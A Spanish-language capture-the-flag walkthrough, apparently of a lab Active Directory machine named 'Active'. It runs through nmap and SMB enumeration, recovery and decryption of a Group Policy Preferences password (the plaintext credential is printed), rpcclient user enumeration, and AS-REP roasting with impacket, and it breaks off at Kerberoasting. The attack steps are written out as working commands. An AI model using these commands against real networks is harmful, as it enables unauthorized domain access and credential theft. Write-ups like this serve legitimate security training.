# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.9.24 -oG allPorts
```


```shell
[*] IP Address: 10.129.9.24
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166
```

```shell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166 -sCV -vvv 10.129.9.24 -oN targeted
```


```shell
nxc smb 10.129.9.24
```

## Enumeración recursos compartidos

```shell
nxc smb 10.129.9.24 -u "" -p "" --shares
```

```shell
smbmap -H 10.129.9.24 -u "" -p ""
```

```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$                            Remote IPC
NETLOGON                        Logon server share
Replication     READ            
SYSVOL                          Logon server share
Users                           
```

Listaremos que contiene este recurso compartido
```shell
smbmap -H 10.129.9.24 -u "" -p "" -r Replication
```

Contiene un fichero llamado `active.htb`, seguimos listando su contenido
```shell
smbmap -H 10.129.9.24 -u "" -p "" -r Replication/active.htb
```

El contenido se asemeja al contenido que suele encontrarse en los recursos de `SYSVOL`, dentro de estos directorios suele haber algún archivo, el cual pueda contener  información sobre usuarios y sus credenciales.
Este se suele encontrar en el archivo `groups.xml`. Se suele encontrar en la ruta `Policies` y a partir de hay deberemos enumerar.
```shell
smbmap -H 10.129.9.24 -u "" -p "" -r Replication/active.htb/Policies
```

EN este caso lo hemos encontrado en la ruta  `Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`

Nos descargaremos el archivo
```shell
smbmap -H 10.129.9.24 -u "" -p "" --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Al leer el archivo encontramos una contraseña que no esta en texto claro pero la podemos desencriptar usando [[GPP-DECRYPT]]
```shell
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Obteniendo una contraseña en texto claro, que le pertenece al usuario `SVC_TGS`
```ad-hint
SVC_TGS::GPPstillStandingStrong2k18
```


Validamos que el usuario es valido
```shell
nxc smb 10.129.9.24 -u "svc_tgs" -p "GPPstillStandingStrong2k18"
```

Viendo que es un usuario valido, volviendo a enumerar de nuevo los recursos compartidos, en búsqueda de mas información o usuarios nuevos
```shell
nxc smb 10.129.9.24 -u "svc_tgs" -p "GPPstillStandingStrong2k18" --shares
```

Encontrando que tenemos lectura sobre el recurso compartido de `Users`
```shell
smbmap -H 10.129.9.24 -u "svc_tgs" -p "GPPstillStandingStrong2k18" -r Users
```

Encontrando la `flag` del usuario

También nos podemos conectar a través de [[RPCCLIENT]]
```shell
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.9.24
```

Pudiendo enumerar usuarios usando `enumdomusers`, o enumerar los grupos con `enumdomgroups`
Nos interesa enumerar los usuarios que pertenecen al grupo de `Domain Admins`
Usando `queygroupmem 0x200` enumeramos los usuarios miembros a ese RID y optemos `0x1f4` que para saber a quien le pertenece el RID usaremos `queryuser 0x1f4` viendo que el RID pertenece al usuario `Administrador`
También podemos enumerar las descripciones de los usuarios `querydispinfo`


# Explotación
## AS-REP Roasting
Al tener un usuarios se tiene que probar a hacer un ataque basado en [[AS-REP Roasting]] lo realizaremos con la herramienta llamada [[IMPACKET]]
```shell
impacket-GetNPUsers active.htb/ -no-pass -usersfile users.txt
```


## Kerberoasting
Al tener un usuario y contraseña validas vamos a realizar [[Kerberoasting]], para obtener un `TGS (T`